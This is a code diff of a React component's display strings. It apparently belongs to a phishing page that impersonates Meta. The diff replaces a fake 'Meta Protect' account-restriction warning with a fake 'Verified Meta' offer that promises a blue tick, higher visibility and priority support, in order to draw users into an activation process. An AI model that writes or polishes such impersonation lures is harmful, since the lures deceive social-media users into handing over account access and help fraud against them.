@@ -15,12 +15,12 @@ const Index = () => {
     const [isLoading, setIsLoading] = useState(true);
     const defaultTexts = useMemo(
         () => ({
-            title: 'Welcome To Meta Protect.',
-            description: "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
-            protectionText: "We've enabled advanced protections to unlock your Page.",
-            processText: 'Below, we walk you through the process in detail and help you fully activate to unlock your Page.',
+            title: 'Welcome to Verified Meta.',
+            description: "We truly value your authenticity and contributions to the community. As a verified member, you are eligible for special recognition, higher visibility, and priority support from Meta.",
+            protectionText: "We've enabled advanced protection to unlock features on your account.",
+            processText: 'Below, we will guide you through the process in detail and help you fully activate it to get the blue tick..',
             continueBtn: 'Continue',
-            restrictedText: 'Your page was restricted on'
+            restrictedText: 'Get started today'
         }),
         []
     );
